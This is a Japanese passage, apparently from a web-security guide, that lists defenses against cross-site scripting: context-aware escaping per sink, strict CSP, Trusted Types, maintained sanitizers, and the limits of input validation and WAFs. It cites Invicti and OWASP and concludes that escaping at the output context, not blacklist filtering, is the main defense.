   Invicti曰く「エンコーディングの選択は文脈に依存する。ブラウザは場所によって文字を違う方法でエンコード／デコードするから」。ユーザー入力が最終的に置かれる **sink（ユーザー入力が実行・解釈される危険な代入先。例: `innerHTML`、`href`、`<script>` ブロック内、`style` 属性）** ごとに、HTMLボディ用・HTML属性用・JavaScript文字列用・URL用・CSS用のエスケープを使い分ける。ここは第1章の防御セクション（出力エンコーディングの原理）と完全に接続します。

2. **フィルタではなくエスケープ。** Invictiの中核命題「フィルタリングではなくエスケープを使うことがXSSを防ぐ唯一信頼できる方法」。ブラックリストは有限で、攻撃表現は無限だから（第11章の原理3）。

3. **CSP（Content Security Policy: どこからスクリプトを読み込み・実行してよいかをブラウザに宣言するHTTPヘッダによる多層防御）を併用する。** ただしInvictiは「CSPは安全なコーディングを**補完**するものであって、置き換えるものではない」と釘を刺します。理想は `nonce`（1回限りの乱数トークンを付けたスクリプトだけを許可）や `strict-dynamic` を用いた厳格CSPで、インラインスクリプトと未許可ソースを原理的に遮断すること。

4. **Trusted Types を導入する（対応ブラウザ）。** DOM系XSSの sink（`innerHTML` など）へ、検証を通した専用の型オブジェクト以外を代入できなくするブラウザ機構。文字列を直接 sink に流す経路を型システムで塞ぐため、mutation XSSを含む DOM XSS の温床を根本から断てる。

5. **信頼できるフレームワーク／ライブラリに任せる。** モダンフレームワーク（React、Angular等）の自動エスケープや、保守されている最新版のサニタイザ（DOMPurify等）を使い、自前の正規表現フィルタを書かない。第12章のとおり、ライブラリは常に最新へ。

6. **入力バリデーションは「多層防御の一枚」であって主対策ではない。** 形式・長さ・許可リスト（whitelist）による入力検証は有用だが、それ単独ではXSSを防げない。エスケープと組み合わせて初めて意味を持つ。

7. **WAFは緩和策であって解決策ではない。** 既知パターンの一時的遮断には役立つが、アプリの文脈を持たないため回避され得る。「WAFが弾いた＝直った」ではない(false sense of security)。

8. **継続的なセキュリティテスト。** 表現は無限に増えるため、スキャナやペネトレーションテストで「新しい回避に耐えられるか」を継続的に検証する。

> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion
> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

#### このセクションの一行結論

**フィルタ（ブラックリスト）は「壊れた入力を修復して実行するブラウザ」と「無限に増える表現」に対して構造的に負ける。防御の主軸は、入力を検閲することではなく、出力する場所（sink）の文脈に合わせて無害化（エスケープ／エンコード）することである。** 回避ペイロードの一つ一つは、この一文を裏づける実例にすぎません。
